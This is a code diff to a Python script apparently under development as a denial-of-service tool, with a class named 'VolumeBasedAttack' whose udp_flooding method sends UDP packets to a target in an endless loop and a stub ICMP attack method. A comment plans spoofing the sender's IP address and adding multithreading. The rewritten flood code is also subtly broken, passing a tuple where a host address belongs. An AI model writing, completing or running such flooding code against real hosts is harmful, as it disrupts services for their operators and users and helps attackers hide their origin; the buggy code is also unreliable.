@@ -3,14 +3,21 @@ import socket as sockk
 import time
 
 class VolumeBasedAttack:
-    def udp_flooding(vector, bye):
-        while True:
-            for i in port:
-                s = sockk.socket(sockk.AF_INET, sockk.SOCK_DGRAM, 0, None)
-                s.sendto(bye,vector)
-                
+    def udp_flooding(bye, vector, port):
+        addr = tuple(vector)
+        s = sockk.socket(sockk.AF_INET, sockk.SOCK_DGRAM)
+        try: 
+            while True:
+                for i in addr:
+                    s.sendto(bye, (addr, port))
+                    
                 #i'll add a method to change th ipaddr of the sender :), and AFTER ALL i'll implement a method to choose btween multithreading and multiprocessing
-
+        except Exception as e:
+            print(f'Error occurred: {e}')
+        finally:
+            s.close() 
+        
+        
     def icmp(vector, bye, port):
         print(f"ICMP attack on {vector} with {len(bye)} bytes")
 
